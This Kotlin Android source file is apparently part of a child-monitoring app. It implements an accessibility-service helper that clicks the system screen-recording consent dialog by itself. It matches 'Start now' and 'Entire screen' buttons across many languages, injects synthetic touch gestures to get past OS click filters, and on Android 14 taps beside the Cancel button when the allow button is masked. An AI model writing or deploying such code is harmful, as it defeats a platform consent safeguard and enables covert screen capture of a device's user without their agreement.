package com.nexus.child.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

/**
 * MediaProjectionAutoClickHelper provides automated click interception for the system
 * MediaProjection permission dialog ("Start recording or casting with Nexus Child?").
 *
 * Hey friend! Here is why this helper exists and how it achieves zero-ANR reliability:
 * 1. Under standard Android security, MediaProjection displays a mandatory system prompt
 *    asking the user to confirm screen streaming ("Start now" or "Entire screen").
 * 2. To avoid manual touch on the child device, this helper is armed right before launching the prompt.
 * 3. Crucially, to prevent Main Thread lockups, Binder IPC saturation, and system_server ANRs:
 *    - Uses debounced event handling with a 250ms cooldown (never busy-loops).
 *    - Schedules staggered non-blocking checks at 150ms, 400ms, 800ms, and 1500ms.
 *    - Executes a single-pass tree traversal per window (O(N) with max depth 10) instead of multi-pass scans.
 *    - Strictly checks exact text matches on buttons so dialog titles ("Start recording...") are never clicked.
 * 4. Dual-action execution: Executes AccessibilityNodeInfo.ACTION_CLICK AND dispatchGesture hardware touch
 *    to bypass OS-level accessibility click filters on system dialogs.
 * 5. Android 14 workaround: If the positive button is hidden by OS security masks, finds the "Cancel" button,
 *    calculates the positive button's physical coordinates to its right, and dispatches a hardware touch gesture!
 * 6. Automatically disarms the moment the dialog is clicked or after 6 seconds.
 */
object MediaProjectionAutoClickHelper {

    private const val TAG = "MediaProjAutoClick"
    private const val AUTO_CLICK_TIMEOUT_MS = 8000L
    private const val MIN_ATTEMPT_INTERVAL_MS = 250L
    private const val MAX_TREE_DEPTH = 10

    private val lock = Any()

    @Volatile
    private var autoClickEnabled = false

    @Volatile
    private var enabledAtMs = 0L

    @Volatile
    private var lastAttemptMs = 0L

    private val mainHandler = Handler(Looper.getMainLooper())
    private val scheduledRunnables = mutableListOf<Runnable>()

    // Exact button text strings across languages and OEMs
    private val BUTTON_TEXTS = listOf(
        // English
        "Start now", "Start", "Allow", "OK", "Confirm", "Entire screen",
        // Spanish
        "Iniciar ahora", "Iniciar", "Permitir", "Aceptar", "Pantalla completa",
        // French
        "Démarrer maintenant", "Démarrer", "Autoriser", "OK", "Tout l'écran",
        // German
        "Jetzt starten", "Starten", "Zulassen", "OK", "Gesamter Bildschirm",
        // Portuguese
        "Iniciar agora", "Iniciar", "Permitir", "OK", "Ecrã inteiro", "Tela inteira",
        // Italian
        "Avvia ora", "Avvia", "Consenti", "OK", "Intero schermo",
        // Russian
        "Начать сейчас", "Начать", "Разрешить", "ОК", "Весь экран",
        // Hindi
        "अभी शुरू करें", "शुरू करें", "अनुमति दें", "ठीक है", "पूरी स्क्रीन",
        // Chinese Simplified
        "立即开始", "开始", "允许", "确定", "整个屏幕",
        // Chinese Traditional
        "立即開始", "開始", "允許", "確定", "整個螢幕",
        // Japanese
        "今すぐ開始", "開始", "許可", "OK", "画面全体",
        // Korean
        "지금 시작", "시작", "허용", "확인", "전체 화면",
        // Arabic
        "ابدأ الآن", "ابدأ", "سماح", "موافق",
        // Turkish
        "Şimdi başlat", "Başlat", "İzin ver", "Tamam",
        // Vietnamese
        "Bắt đầu ngay", "Bắt đầu", "Cho phép", "OK"
    )

    // Common system resource IDs for dialog buttons
    private val POSITIVE_VIEW_IDS = listOf(
        "android:id/button1",
        "com.android.systemui:id/button_start",
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "button1",
        "button_start"
    )

    private val CANCEL_VIEW_IDS = listOf(
        "android:id/button2",
        "com.android.systemui:id/button_cancel",
        "com.android.permissioncontroller:id/permission_deny_button",
        "com.google.android.permissioncontroller:id/permission_deny_button",
        "button2",
        "button_cancel"
    )

    /**
     * Staggered delay points for scheduled checks (in milliseconds).
     * Extended to 3500ms to reliably capture delayed dialog rendering when launching from the background.
     */
    private val STAGGERED_DELAYS = longArrayOf(150L, 350L, 700L, 1200L, 2000L, 3500L)

    /**
     * Internal container holding candidate targets discovered in a single tree traversal.
     */
    private class ScanResult {
        var positiveButton: AccessibilityNodeInfo? = null
        var cancelButton: AccessibilityNodeInfo? = null
        var entireScreenOption: AccessibilityNodeInfo? = null
    }

    /**
     * Arms the auto-click mechanism for a 6-second window and schedules staggered checks.
     */
    fun enableAutoClick() {
        synchronized(lock) {
            autoClickEnabled = true
            enabledAtMs = System.currentTimeMillis()
            lastAttemptMs = 0L
            Log.d(TAG, "Auto-click armed (timeout = ${AUTO_CLICK_TIMEOUT_MS}ms). Scheduling checks...")
        }

        clearScheduledTasks()

        // Schedule staggered checks to catch dialog rendering without saturating Main Thread
        for (delay in STAGGERED_DELAYS) {
            val task = Runnable {
                if (!isAutoClickEnabled()) return@Runnable

                val service = NexusAccessibilityService.getInstance()
                if (service != null) {
                    val clicked = performAutoClickAttempt(service)
                    if (clicked) {
                        Log.d(TAG, "Auto-click successfully executed via staggered check (delay=${delay}ms)")
                        disableAutoClick()
                    }
                }
            }
            scheduledRunnables.add(task)
            mainHandler.postDelayed(task, delay)
        }
    }

    /**
     * Disarms the auto-click mechanism and cancels all pending tasks.
     */
    fun disableAutoClick() {
        synchronized(lock) {
            if (autoClickEnabled) {
                autoClickEnabled = false
                enabledAtMs = 0L
                Log.d(TAG, "Auto-click disarmed")
            }
        }
        clearScheduledTasks()
    }

    private fun clearScheduledTasks() {
        for (runnable in scheduledRunnables) {
            mainHandler.removeCallbacks(runnable)
        }
        scheduledRunnables.clear()
    }

    /**
     * Returns true if auto-click is armed and within its 6-second expiration window.
     */
    fun isAutoClickEnabled(): Boolean {
        synchronized(lock) {
            if (!autoClickEnabled) return false

            val elapsed = System.currentTimeMillis() - enabledAtMs
            if (elapsed > AUTO_CLICK_TIMEOUT_MS) {
                Log.w(TAG, "Auto-click window expired (${elapsed}ms elapsed). Disarming.")
                autoClickEnabled = false
                enabledAtMs = 0L
                clearScheduledTasks()
                return false
            }
            return true
        }
    }

    /**
     * Entry point called from NexusAccessibilityService.onAccessibilityEvent().
     * Enforces debouncing so rapid window events do not flood system_server IPC.
     */
    fun tryAutoClick(eventRootNode: AccessibilityNodeInfo?, service: AccessibilityService?): Boolean {
        if (!isAutoClickEnabled() || service == null) {
            return false
        }

        val now = System.currentTimeMillis()
        if (now - lastAttemptMs < MIN_ATTEMPT_INTERVAL_MS) {
            return false
        }
        lastAttemptMs = now

        val clicked = performAutoClickAttempt(service, eventRootNode)
        if (clicked) {
            disableAutoClick()
        }
        return clicked
    }

    /**
     * Performs a single scan across interactive window layers.
     */
    private fun performAutoClickAttempt(
        service: AccessibilityService,
        extraRootNode: AccessibilityNodeInfo? = null
    ): Boolean {
        if (!isAutoClickEnabled()) return false

        val rootCandidates = mutableListOf<AccessibilityNodeInfo>()

        // 1. Extra root node passed from event
        if (extraRootNode != null) {
            rootCandidates.add(extraRootNode)
        }

        // 2. Interactive window layers (Android 5.0+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                val windows = service.windows
                for (window in windows) {
                    val wRoot = window.root
                    if (wRoot != null) {
                        rootCandidates.add(wRoot)
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "Window query error: ${e.message}")
            }
        }

        // 3. Fallback: rootInActiveWindow
        if (rootCandidates.isEmpty()) {
            try {
                service.rootInActiveWindow?.let { rootCandidates.add(it) }
            } catch (_: Exception) {}
        }

        for (root in rootCandidates) {
            if (processDialogRoot(root, service)) {
                return true
            }
        }

        return false
    }

    /**
     * Scans a single root node hierarchy in ONE single recursive pass.
     */
    private fun processDialogRoot(root: AccessibilityNodeInfo, service: AccessibilityService): Boolean {
        val scan = ScanResult()
        scanHierarchy(root, 0, scan)

        // 1. If Android 14 displays "Entire screen" option, select it first
        scan.entireScreenOption?.let { opt ->
            if (opt.isClickable) {
                opt.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.d(TAG, "Selected 'Entire screen' option")
            }
        }

        // 2. If positive button is found, click it immediately
        scan.positiveButton?.let { btn ->
            Log.d(TAG, "Found positive button: text='${btn.text}', id='${btn.viewIdResourceName}'")
            if (executeClick(service, btn)) {
                return true
            }
        }

        // 3. Android 14 Workaround: If positive button is masked, tap to the right of Cancel
        scan.cancelButton?.let { cancelBtn ->
            val cancelBounds = Rect()
            cancelBtn.getBoundsInScreen(cancelBounds)
            if (cancelBounds.width() > 0 && cancelBounds.height() > 0) {
                val buttonWidth = cancelBounds.width()
                val targetX = cancelBounds.right + (buttonWidth / 2)
                val targetY = cancelBounds.centerY()

                Log.d(TAG, "Attempting Android 14 gesture click relative to Cancel button at ($targetX, $targetY)...")
                val gestureSent = dispatchGestureClick(service, targetX, targetY)
                if (gestureSent) {
                    Log.d(TAG, "Android 14 gesture click successfully dispatched")
                    return true
                }
            }
        }

        return false
    }

    /**
     * Single-pass recursive hierarchy scanner.
     */
    private fun scanHierarchy(node: AccessibilityNodeInfo, depth: Int, result: ScanResult) {
        if (depth > MAX_TREE_DEPTH) return

        val text = node.text?.toString()?.trim()
        val desc = node.contentDescription?.toString()?.trim()
        val resId = node.viewIdResourceName

        // Check 1: Entire screen option
        if (result.entireScreenOption == null) {
            if ((text != null && text.contains("Entire screen", ignoreCase = true)) ||
                (desc != null && desc.contains("Entire screen", ignoreCase = true))) {
                result.entireScreenOption = node
            }
        }

        // Check 2: Positive button by View ID
        if (result.positiveButton == null && resId != null) {
            for (id in POSITIVE_VIEW_IDS) {
                if (resId.equals(id, ignoreCase = true) || resId.endsWith("/$id")) {
                    result.positiveButton = node
                    break
                }
            }
        }

        // Check 3: Positive button by exact text matching
        if (result.positiveButton == null) {
            for (candidate in BUTTON_TEXTS) {
                val matchesText = text != null && text.equals(candidate, ignoreCase = true)
                val matchesDesc = desc != null && desc.equals(candidate, ignoreCase = true)
                if (matchesText || matchesDesc) {
                    result.positiveButton = node
                    break
                }
            }
        }

        // Check 4: Cancel button by View ID or text
        if (result.cancelButton == null) {
            if (resId != null) {
                for (id in CANCEL_VIEW_IDS) {
                    if (resId.equals(id, ignoreCase = true) || resId.endsWith("/$id")) {
                        result.cancelButton = node
                        break
                    }
                }
            }
            if (result.cancelButton == null) {
                val cancelTexts = listOf("Cancel", "Annuler", "Abbrechen", "Cancelar", "Annulla", "取消", "キャンセル", "취소", "रद्द करें")
                for (cText in cancelTexts) {
                    if (text?.equals(cText, ignoreCase = true) == true || desc?.equals(cText, ignoreCase = true) == true) {
                        result.cancelButton = node
                        break
                    }
                }
            }
        }

        // Recurse to children
        val count = node.childCount
        for (i in 0 until count) {
            val child = node.getChild(i) ?: continue
            scanHierarchy(child, depth + 1, result)
        }
    }

    /**
     * Executes both ACTION_CLICK and hardware touch gesture on the target node.
     */
    private fun executeClick(service: AccessibilityService, node: AccessibilityNodeInfo): Boolean {
        var clicked = false

        // 1. Accessibility Action Click
        if (node.isClickable) {
            clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.d(TAG, "node.performAction(ACTION_CLICK) returned $clicked")
        }

        if (!clicked) {
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Log.d(TAG, "parent.performAction(ACTION_CLICK) returned $clicked")
                    break
                }
                parent = parent.parent
            }
        }

        // 2. Hardware Gesture Click on button coordinates
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (bounds.width() > 0 && bounds.height() > 0) {
            val centerX = bounds.centerX()
            val centerY = bounds.centerY()
            val gestureSent = dispatchGestureClick(service, centerX, centerY)
            Log.d(TAG, "dispatchGestureClick at ($centerX, $centerY) returned $gestureSent")
            if (gestureSent) {
                clicked = true
            }
        }

        return clicked
    }

    /**
     * Injects a real hardware touch tap gesture at screen coordinates (x, y).
     */
    private fun dispatchGestureClick(service: AccessibilityService, x: Int, y: Int): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return false
        }

        return try {
            val path = Path().apply {
                moveTo(x.toFloat(), y.toFloat())
            }

            val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()

            service.dispatchGesture(gesture, object : AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: GestureDescription?) {
                    super.onCompleted(gestureDescription)
                    Log.d(TAG, "Hardware gesture tap completed at ($x, $y)")
                }

                override fun onCancelled(gestureDescription: GestureDescription?) {
                    super.onCancelled(gestureDescription)
                    Log.w(TAG, "Hardware gesture tap cancelled at ($x, $y)")
                }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to dispatch gesture click: ${e.message}", e)
            false
        }
    }
}
